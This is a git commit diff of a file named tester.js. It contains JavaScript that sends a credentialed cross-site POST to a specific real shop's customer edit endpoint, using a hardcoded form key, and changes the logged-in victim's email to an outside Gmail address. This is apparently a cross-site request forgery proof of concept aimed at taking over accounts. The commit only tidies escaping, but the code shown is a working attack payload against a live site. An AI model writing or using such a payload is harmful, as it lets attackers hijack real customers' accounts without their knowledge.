2e23bc4263fd04e5e2e85fd3d254965a9de2dc72
rentixeli <73320873+rentixeli@users.noreply.github.com>
2021-09-29 13:48:39 +0300

    Update tester.js

--- tester.js
+++ tester.js
@@ -6,17 +6,17 @@
 
         var xhr = new XMLHttpRequest();
 
-        xhr.open("POST", "https:\/\/www.fixfixfixfix.co.il\/customer\/ajax\/post\/", true);
+        xhr.open("POST", "https://www.fixfixfixfix.co.il/customer/ajax/post/", true);
 
-        xhr.setRequestHeader("Accept", "application\/json, text\/javascript, *\/*; q=0.01");
+        xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");
 
         xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
 
-        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
 
         xhr.withCredentials = true;
 
-        var body = "form_key=xCThnAxL71YFV23A&bot_validation=1&type=edit&firstname=test&lastname=tester&telephone=&email=steaminfo.supp%40gmail.com";
+        var body = "form_key=xCThnAxL71YFV23A&bot_validation=1&type=edit&firstname=test&lastname=tester&telephone=&email=steaminfo.supp@gmail.com";
 
         var aBody = new Uint8Array(body.length);
 
